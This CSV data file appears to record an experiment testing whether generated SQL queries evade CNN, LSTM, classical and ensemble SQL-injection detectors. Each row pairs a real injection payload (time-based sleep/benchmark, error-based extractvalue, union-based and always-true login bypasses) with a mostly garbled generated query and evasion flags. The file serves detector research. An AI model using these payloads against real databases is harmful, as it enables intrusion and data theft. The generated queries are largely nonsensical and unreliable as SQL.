original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
select   (  case when   (  8993  =  8846  )   then 8993 else 8993*  (  select 8993 from mysql.db  )   end  )  #,SELECT 8993 FROM mysql.db ) end  (SELECT 8993 FROM Query: SELECT 8993 FROM mysql.db ) AS _valid FROM SQL_injector WHERE NOT 8993 = 8846 ORDER BY COUNT(*) DESC LIMIT 1),1,1,0,0,0,0,0
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'yxpi'  =  'yxpi,SELECT DISTINCT (sql injection) FROM SQL injection) AND NOT (sql injection = 'evade_syst' ORDER BY COUNT(sql injection),1,1,1,0,0,0,0
-3598  )   union all select 2264#,SELECT DISTINCT esq injection detection FROM SQL SELECT DISTINCT esq injection detection,1,0,1,1,1,1,1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  'pshn' like 'pshn","SELECT * FROM SQL_injection WHERE NOT rdb$types = 't2,rdb$collations as t3,rdb$functions as t4 AND ((((*) * ) FROM SQL injection)",0,1,0,0,0,0,0
"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",SELECT MIN(5037 = 5037) FROM SQL injection,1,1,0,0,1,0,0
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT id = '1' + @ ( 1 ) union select 1,version ( ) -- 1'",1,1,0,0,0,0,0
"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",SELECT 6793 FROM pg_sleep WHERE NOT 6793 = (SELECT 6793 FROM pg_sleep ( 5 ) ORDER BY 6793,0,1,0,1,0,0,0
"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'dtym'  =  'dtym","SELECT MIN(success injection) FROM SQL_Injections WHERE NOT elt (3393 = 3393,concat) = 'dtym'",1,1,0,0,1,0,0
1%'  )   and 9226  =  7542--,SELECT MIN(SQL) FROM SQL Injection),1,0,1,1,1,1,1
select   (  case when   (  9907  =  2736  )   then 9907 else 9907*  (  select 9907 from mysql.db  )   end  )  #,SELECT 9907 FROM mysql.db ) end  (SELECT SUM(invalid SQL) FROM query: select) FROM query: select (SELECT SUM(9907) FROM query: select 9907 WHERE NOT SELECT SUM(9907 = 2736) AND NOT SELECT SUM(9907 = 9907) FROM Query: SELECT SUM(9907) FROM 199907 WHERE NOT SELECT SUM(9907 = 2736),1,1,0,0,1,0,0
"1  )   where 5048  =  5048 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT NOT SQL_inject_rePLXP000000 FROM SQL WHERE 5048 = 5048 OR NULl = 5048 ORDER BY 100,0,1,1,1,0,1,0
"1  )   where 5385  =  5385 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",SELECT COUNT(*) FROM SQL_Injection WHERE 5385 = 5385 OR 411 = 411 = 411 = 411,1,1,0,0,0,0,0
1'  )   where 1183  =  1183,SELECT MIN(1183 = 1183) FROM SQL injection detection,1,0,1,1,1,1,1
"1' in boolean mode  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","SELECT * FROM SQL_injection WHERE NOT rdb$types = 't2,rdb$collations as t3,rdb$functions as t4"" ORDER BY COUNT(*) DESC LIMIT 1",0,1,0,0,0,0,0
-7772'   )    )    or 9323  =  9323#,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT 9323 = 9323,1,1,1,0,1,1,0
"1""   )    )    as nhus where 3689  =  3689",SELECT MIN(3689 = 3689) FROM SQL injection detection,1,0,1,1,1,1,1
"1%'   )    )     )   union all select null,null,null,null#","SELECT DISTINCT null,null,null FROM SQL SELECT MIN(sql injection) FROM SQL",1,0,1,1,1,1,1
"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--",SELECT MIN(sqdut) FROM SQL injection_detecting,1,0,1,1,1,1,1
"1   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --","SELECT * FROM chr WHERE NOT SQL_injection_message = ""valid"" ORDER BY chr ( 87 ) ORDER BY chr ( 7427 = ""dbms_pipe.receive_message)",1,0,0,0,1,0,0
"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""alvd"" like ""alvd","SELECT MIN(""alvd"") FROM SQL injection detection",1,0,1,0,1,1,0
"-5026' where 7324  =  7324 union all select 7324,7324--",SELECT MIN(SQL injection) FROM SQL - 7324--,1,1,1,1,0,1,0
"-9150%'   )    )     )   union all select 7057,7057,7057,7057,7057,7057,7057,7057--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: -9150%',1,1,0,1,1,1,0
"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--","SELECT MIN(6189,6189,6189,6189,6189,6189-- FROM SQL_Injection WHERE NOT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,6189,",1,1,1,0,0,0,0
"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'bdsq' like 'bdsq",SELECT MIN(sq) FROM SQL injection - SELECT MIN(sq) FROM SQL - SELECT MIN(sq) FROM SQL,1,1,1,1,1,1,1
"1""   )    )    as dksq where 7161  =  7161",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#","SELECT MIN(sql injection) FROM 7845,7845,7845,7845,7845,7845# FROM SQL_Injection WHERE NOT SELECT MIN(sql injection) FROM SELECT 7845,7845,7845,7845,7845,7845# FROM Query: -3370",1,1,1,0,0,0,0
"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --","SELECT 6793 FROM pg_sleep WHERE ""sql injection"" = 'evadesq injection'",1,0,1,0,0,0,0
"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #","SELECT MIN(excat) FROM SQL injection, extractvalue WHERE NOT 0x4b774c75 ) = 'excess'",1,1,0,0,1,0,0
"1'  )   and elt  (  3528  =  3566,3566  )  ","SELECT MIN(3528 = 3566,3566) FROM SQL injections WHERE NOT SELECT SELECT DISTINCT elt ( 3528 = 3566,3566) FROM SQL injection detection",1,1,1,1,1,1,1
"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lazm"" like ""lazm",SELECT MIN(*) FROM SQL_injection) FROM SQL_injection,1,0,1,1,1,1,1
"1%""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""%""  =  """,SELECT MIN(s) FROM SQL injection_description) FROM SQL - SELECT MIN(s) FROM SQL - SELECT MIN(s) FROM SQL - SELECT MIN(s) FROM SQL - SELECT MIN(s) FROM SQL,1,1,0,0,1,0,0
1'||  (  select 'sliy' where 9494  =  9494,SELECT SELECT'sliy' FROM SQL injection',1,0,1,1,1,1,1
"-2377%'   )    )     )   union all select 7706,7706--","SELECT MIN(sql injection) FROM SQL SELECT 7706,7706-- FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM Query: -2377%'",1,1,0,1,1,1,0
"1%"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  """,SELECT MIN(success injection) FROM SQL SELECT MIN(success injection) FROM SQL SELECT MIN(success injection) FROM SQL SELECT MIN(success) FROM SQL SELECT MIN(success) FROM SQL SELECT MIN(success) FROM SQL SELECT MIN(success) FROM Query: 1%) AND 8514 = (SELECT MIN(SELECT SUM(SQ_CHCH) FROM SQL SELECT & % FROM SQL SELECT & t1.success__description) FROM SQL JOIN t1 AS t2 ON t1.domain.domain.domain.domain.domain.domain.name = 'SQ injection'),1,1,0,0,1,0,0
"1""   )    )    or sleep  (  5  )  #",SELECT MIN(5 - 1) FROM SQL injection detection,1,1,1,1,1,1,1
1'+  (  select 'iyyv' where 9500  =  9500 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +',SELECT MIN(sql injection) FROM SQL - SELECT DISTINCT iyyv FROM '9500 = 9500' ORDER BY iyyv,1,1,1,1,0,1,0
"-3541"" or make_set  (  9354  =  9354,7185  )   and ""fgxu""  =  ""fgxu","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT 9354 = 9354 = 9354,7185 & ""fgxu"" = ""fgxu""",1,1,1,0,0,0,0
"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT NOT SQL_key FROM SQL ORDER BY _valid_inject,1,0,1,1,1,1,1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*","SELECT 3000000,MD5(1) FROM SQL AS t1 JOIN query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM SQL AS t2 ON t1.number = 0 AND t2.sql = 'valid'",0,1,0,0,1,0,0
"1%""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #","SELECT MIN(excat) FROM SQL injection, extractvalue WHERE NOT md5 ( 0x4b774c75 ) = 'evade'",1,1,0,0,1,0,0
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--","SELECT MIN(3000000,MD5(1)) FROM SQL injection AS t1 JOIN Query: '+if(benchmark(3000000,MD5(1)) FROM SQL injection'",0,1,0,0,1,0,0
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""eakt"" like ""eakt",SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM – select * from (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT SUM((SELECT SUM((SELECT SUM((SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM (SELECT,1,0,1,1,1,1,1
-2992'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'tjgt'  =  'tjgt,SELECT MIN(sql injection) FROM SQL -2992' ORDER BY MIN(sql injection),0,1,1,1,0,1,0
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'yctp'  =  'yctp,SELECT DISTINCT 'evade SQL injection' FROM SQL SELECT SELECT DISTINCT ((((((()) FROM (SELECT SUM(((((((((sqtp) FROM SQL)),1,1,0,0,1,0,0
1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,SELECT MIN(1 AS __) FROM SQL_injection WHERE NOT jxtg = '1071 = 1071' AND sleep ( 5 ),1,1,0,0,0,0,0
1  )   where 2543  =  2543,SELECT * FROM query: 1 JOIN SQL injection query: 2543 = 2543 WHERE NOT SQL_Injection = 2543,0,0,1,1,1,1,1
1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,SELECT MIN(sql injection) FROM SQL_injection WHERE 6913 = 6913 AND 4386 = utl_inaddr.inaddr.chr ( 112 ) ||chr ( 112 ) FROM chr ( 113 ) ORDER BY chr ( 4386 = 4386),1,1,0,0,0,0,0
"admin"" or ""1""  =  ""1""#",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
-2411 or   (  8459  =  8459  )  *4906# pxwg,"SELECT 8459 = 8459 AND NOT SQL_inject = ""valid""",1,1,1,0,0,0,0
-7565%'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',"SELECT DISTINCT esq_injection FROM SQL SELECT esq_injection_method, COUNT(*) FROM SQL INNER JOIN (SELECT t1.case FROM SQL_injection_method_code AS t1 ON t1.succes = t2.succes = t2.succes = 'evade') ORDER BY t2.2724 = 2724",0,0,0,0,1,0,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""pdqm"" like ""pdqm","SELECT DISTINCT pdqm FROM ""SQL INSECT MIN(sql)"" FROM SQL JOIN (SELECT MIN(sql) FROM SELECT MIN(sql) FROM pdqm)",1,0,1,0,1,1,0
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE id = 1 OR NOT id = 1 OR 1 = 1,1,1,1,0,0,0,0
"1%'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  '%'  =  '","SELECT MIN(5000000,md5 ( 0x76555642 ) FROM SQL injection detection",1,1,0,0,1,0,0
"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr","SELECT MIN(sequence) FROM SQL injection - SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM query: 1 AND rkvr = ""rkvr""",1,1,1,0,1,1,0
1'+  (  select 'phtz' where 3171  =  3171,SELECT MIN(sql injection) FROM SQL SELECT 'evade SQL injection detection' FROM query: 1'+ WHERE 3171 = 3171 = 3171,1,0,0,1,0,0,0
1'  )   where 5540  =  5540 waitfor delay '0:0:5'--,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
'/**/or/**/1/**/=/**/1,SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT SELECT DISTINCT * FROM SQL,1,0,1,1,1,1,1
"1"" where 4082  =  4082 and elt  (  5699  =  1432,1432  )  --","SELECT MIN(1432,1432) FROM SQL_Injection WHERE 4082 = 4082 AND NOT elt ( 5699 = 1432,1432 )",1,1,0,0,0,0,0
"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #","SELECT MIN(5000000,md5 ( 0x6d457153 ) FROM SQL injection AS T1 JOIN Query: 1' AND T1.md5 = ""5000000,md5 ( 0x6d457153 )""",1,1,0,0,0,0,0
"1'  )   as ohnu where 4097  =  4097 union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
INSERT INTO table,"SELECT MIN(sql) FROM table_name WHERE NOT SELECT MIN(sql) FROM table_name = ""sq injection""",1,0,1,0,1,1,0
"1%"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""%""  =  ""","SELECT * FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 INTERSECT SELECT * FROM SQL_Injection"" ORDER BY * DESC LIMIT 1",1,0,0,1,0,0,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'fvda' like 'fvda","SELECT dbms_pipe.receive_message, MIN(sql) FROM dbms_pipe.receive_message WHERE NOT chr ( 101 ) = 67)",1,0,0,0,1,0,0
1'||  (  select 'yzdz' where 5021  =  5021,SELECT 'evade SQL injection detection' FROM SQL SELECT SELECT MIN(5021 = 5021) FROM SQL SELECT SELECT 'yzdz' FROM SQL SELECT SELECT MIN(5021 = 5021) FROM SQL,1,1,1,1,1,1,1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--",SELECT MIN(11--) FROM SQL_injection,1,0,1,1,1,1,1
"1   )    )    union all select null,null,null,null,null,null,null,null--","SELECT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null, null, null, null, null, null, null, null, null-- sulf injection detection,'sq'",1,0,1,0,0,0,0
"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",SELECT MIN(s) FROM SQL injection_description) FROM SQL SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SQL,1,0,0,0,1,0,0
if  (  9690  =  6491  )   select 9690 else drop function nyln--,SELECT 9690 FROM SQL injection detection,1,0,1,1,1,1,1
"1"" where 7380  =  7380 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",SELECT MIN(*) FROM SQL injection detection WHERE 7380 = 7380 OR 7380 = 7380 OR domain.domain.tables = 9643 = (SELECT MIN(*) FROM SQL SELECT MIN(SELECT MIN(*) FROM SQL SELECT MIN(SELECT MIN(*) FROM SQL SELECT MIN(SELECT MIN(*) FROM SQL SELECT MIN(SELECT MIN(*) FROM Query: 1) FROM SQL SELECT SELECT MIN(SELECT SUM(SQL) FROM SELECT MIN(SQL - 7380 = 7380 = 7380 = 7380 = 7380 ORDER BY 9643 = (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SQ_1) FROM SQL SELECT MIN(SELECT,1,1,0,0,1,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",SELECT DISTINCT SELECT FROM sys.all_tables WHERE LIMIT = 1 AND NOT i'= 'example',0,0,1,0,0,0,0
"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'tvar'  =  'tvar",SELECT MIN(sql) FROM SQL injection - SELECT MIN(sql) FROM SQL,1,1,1,1,1,1,1
"1'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT * FROM SQL_injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 JOIN SELECT MIN(*) FROM SQL_injection) FROM sysibm.systables as t2,sysibm.systables as t3 FROM SELECT MIN(*) FROM SQL_injection) ='sq injection'",1,1,0,0,1,0,0
1  )   where 4600  =  4600 or sleep  (  5  )  --,"SELECT * FROM query: 1 WHERE 4600 = 4600 OR sleep ( 5 ) = ""valid"" AND NOT SQL_injection"" = ""sq injection""",1,1,0,0,0,0,0
"1 where 6881  =  6881 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --","SELECT MIN(extractionvalue) FROM SQL, SELECT MIN(extractionvalue) FROM SQL, SELECT MIN(extractionvalue) FROM SELECT MIN(extractionvalue) FROM SELECT MIN(extractionvalue) FROM SELECT MIN(extractionvalue) FROM SELECT MIN(extractionvalue) FROM SELECT MIN(extractionvalue) FROM SQL injection",1,1,1,0,1,1,0
"1' and elt  (  1533  =  5695,5695  )   and 'ycgi'  =  'ycgi","SELECT MIN(1533 = 5695,5695 ) FROM SQL injection detection WHERE NOT SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(1533 = 5695,5695 ) FROM 'ycgi' = 'ycgi'",1,1,0,0,1,0,0
"1""   )    )     )   and 4595  =  4595#",SELECT MIN(4595 = 4595#) FROM SQL injection,1,0,0,0,1,0,0
1' and non_existant_table = '1,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'","SELECT MIN(sql injection) FROM SQL Query: '1' union select #,@@VERSION -- 1'",0,1,1,0,0,0,0
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24","SELECT MIN(sql injection) FROM SQL JOIN 1,2,3,4,5,7,9,0 FROM SQL JOIN detection of evade SQL injection detection",0,0,1,0,0,0,0
"1"" where 3678  =  3678 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",SELECT MIN(sql injection) FROM SQL_injection WHERE 3678 = 3678 AND 6537 = dbms_pipe.receive_message (chr ( 65 ) = 'dbms_pipe.receive_message',1,1,0,0,0,0,0
